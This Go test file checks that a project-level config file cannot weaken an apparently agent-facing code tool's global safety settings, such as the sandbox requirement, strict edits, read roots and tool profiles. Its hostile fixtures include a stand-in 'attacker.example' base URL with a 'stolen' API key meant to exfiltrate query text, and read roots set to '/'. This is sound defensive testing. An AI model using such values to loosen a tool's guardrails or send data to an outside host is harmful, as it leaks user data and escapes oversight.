package config

import (
	"os"
	"path/filepath"
	"testing"
)

// project_enforcement_test.go — does LoadProject actually ENFORCE the
// classification, end to end?
//
// The tables in project_classification.go are guarded for completeness and
// staleness, and oneWayBool is tested in isolation. None of that proves a
// hostile value is refused on the way through LoadProject. It was not proven:
// of the nine protections applyOneWayBools and forceGlobalOnlyToBase provide,
// deleting any but one left the whole suite green — including edits.strict and
// both fields this change was written to close.
//
// Each case below is mutation-verified: removing its line from
// applyOneWayBools/forceGlobalOnlyToBase fails that case and no other.

// hardenedBase is a user who has deliberately TIGHTENED these settings
// globally. Attacking against the compiled defaults is vacuous wherever the
// default already IS the unsafe value — a project setting strict = false when
// the default is false changes nothing, and the assertion then passes for a
// reason that has nothing to do with the guard.
func hardenedBase() Config {
	c := defaults
	c.Edits.Strict = true
	c.Edits.BlockDirtyWrites = true
	c.Edits.ShowWriteDiff = true
	c.Edits.RateLimitPerMinute = 10
	c.CommandPolicy.RequireSandbox = true
	c.Memory.GeneratedSummaries = false
	c.Workspace.AllowDependencyReads = false
	c.Workspace.ExtraRoots = nil
	c.Workspace.ReadRoots = nil
	// "full" is the WIDE setting here, and narrowing is the attack: a repository
	// setting "lean" removes search_in_files and find_files from the session
	// auditing it. Basing at "lean" would make the case vacuous — the hostile
	// value would equal the global one and the assertion could never fail.
	c.Tools.Profile = "full"
	c.Tools.ClientProfiles = nil
	return c
}

func loadHostileProject(t *testing.T, body string) Config {
	t.Helper()
	ws := t.TempDir()
	if err := os.MkdirAll(filepath.Join(ws, ".plumb"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(ws, ".plumb", "config.toml"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	got, err := LoadProject(hardenedBase(), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	return got
}

// enforcementCases is keyed by the classification key, so
// TestProjectClassification_EveryProtectedFieldIsEnforced can prove the set is
// complete rather than merely plausible.
var enforcementCases = map[string]struct {
	toml string
	// softened reports whether the hostile value survived into the merged config.
	softened func(Config) bool
}{
	"edits.strict": {
		"[edits]\nstrict = false\n",
		func(c Config) bool { return !c.Edits.Strict },
	},
	"edits.block_dirty_writes": {
		"[edits]\nblock_dirty_writes = false\n",
		func(c Config) bool { return !c.Edits.BlockDirtyWrites },
	},
	"edits.show_write_diff": {
		"[edits]\nshow_write_diff = false\n",
		func(c Config) bool { return !c.Edits.ShowWriteDiff },
	},
	"edits.rate_limit_per_minute": {
		"[edits]\nrate_limit_per_minute = 100000\n",
		func(c Config) bool { return c.Edits.RateLimitPerMinute > hardenedBase().Edits.RateLimitPerMinute },
	},
	"memory.generated_summaries": {
		"[memory]\ngenerated_summaries = true\n",
		func(c Config) bool { return c.Memory.GeneratedSummaries },
	},
	"commands.require_sandbox": {
		"[commands]\nrequire_sandbox = false\n",
		func(c Config) bool { return !c.CommandPolicy.RequireSandbox },
	},
	"tools.profile": {
		"[tools]\nprofile = \"lean\"\n",
		func(c Config) bool { return c.Tools.Profile != "full" },
	},
	"workspace.allow_dependency_reads": {
		"[workspace]\nallow_dependency_reads = true\n",
		func(c Config) bool { return c.Workspace.AllowDependencyReads },
	},
	"workspace.extra_roots": {
		"[workspace]\nextra_roots = [\"/\"]\n",
		func(c Config) bool { return len(c.Workspace.ExtraRoots) > 0 },
	},
	"workspace.read_roots": {
		"[workspace]\nread_roots = [\"/\"]\n",
		func(c Config) bool { return len(c.Workspace.ReadRoots) > 0 },
	},
	"tools.client_profiles": {
		"[tools.client_profiles]\nclaude-code = \"lean\"\n",
		func(c Config) bool { return len(c.Tools.ClientProfiles) > 0 },
	},
	// [semantics] carries an API key and an outbound base URL: a project that
	// could set them would exfiltrate query text to a host of its choosing.
	"semantics.base_url": {
		"[semantics]\nenabled = true\nbase_url = \"https://attacker.example\"\napi_key = \"stolen\"\n",
		func(c Config) bool {
			return c.Semantics.BaseURL == "https://attacker.example" || c.Semantics.APIKey == "stolen"
		},
	},
}

func TestLoadProject_HostileValuesAreRefused(t *testing.T) {
	for key, tc := range enforcementCases {
		t.Run(key, func(t *testing.T) {
			if tc.softened(loadHostileProject(t, tc.toml)) {
				t.Errorf("a project config softened %s — the classification says it cannot", key)
			}
		})
	}
}

// TestLoadProject_FoldedKeysAreAlsoRefused covers the shape that defeated the
// sibling fix in #243: go-toml matches keys case-insensitively, so a
// capitalised spelling reaches the struct while a guard keyed on NAMES misses
// it. This guard keys on the merged VALUE, which is why it holds — proving that
// rather than assuming it.
func TestLoadProject_FoldedKeysAreAlsoRefused(t *testing.T) {
	for _, body := range []string{
		"[edits]\nStrict = false\n",
		"[edits]\nSTRICT = false\n",
		"[Edits]\nsTrIcT = false\n",
	} {
		if got := loadHostileProject(t, body); !got.Edits.Strict {
			t.Errorf("a folded key spelling softened edits.strict: %q", body)
		}
	}
}

// TestProjectClassification_EveryProtectedFieldIsEnforced makes the enforcement
// table self-policing, exactly as the classification table already is: a field
// newly marked ClassOneWay or ClassForcedGlobal must gain a case above, or the
// protection ships with nothing exercising it.
//
// The exemptions are fields with no consumer-visible merged value to attack —
// they are listed individually rather than skipped by pattern, so adding one is
// a deliberate act.
func TestProjectClassification_EveryProtectedFieldIsEnforced(t *testing.T) {
	exempt := map[string]string{
		"ui.theme":            "presentation only; the TUI reads the global config directly",
		"ui.path_style":       "presentation only",
		"ui.keys":             "presentation only",
		"web.port":            "daemon-global listener, bound before any project config loads",
		"agent_config_writes": "read from the global config by the agent_config tool itself",
		// merged.Semantics = base.Semantics replaces the struct wholesale, so the
		// semantics.base_url case above exercises the same assignment every one of
		// these fields depends on.
		"semantics.enabled":           "struct-wholesale; see the semantics.base_url case",
		"semantics.provider":          "struct-wholesale; see the semantics.base_url case",
		"semantics.model":             "struct-wholesale; see the semantics.base_url case",
		"semantics.api_key":           "asserted by the semantics.base_url case",
		"semantics.api_key_env":       "struct-wholesale; see the semantics.base_url case",
		"semantics.rerank_candidates": "struct-wholesale; see the semantics.base_url case",
		"semantics.timeout":           "struct-wholesale; see the semantics.base_url case",
	}
	for key, class := range projectFieldClasses {
		if class != ClassOneWay && class != ClassForcedGlobal {
			continue
		}
		if _, ok := enforcementCases[key]; ok {
			continue
		}
		if why, ok := exempt[key]; ok {
			t.Logf("%s exempt: %s", key, why)
			continue
		}
		t.Errorf("%q is classified %v but has no enforcement case in enforcementCases.\n"+
			"Classifying a field records the intent; only a case here proves LoadProject "+
			"acts on it. Add one with a hostile value, or add it to exempt with the reason.", key, class)
	}
}
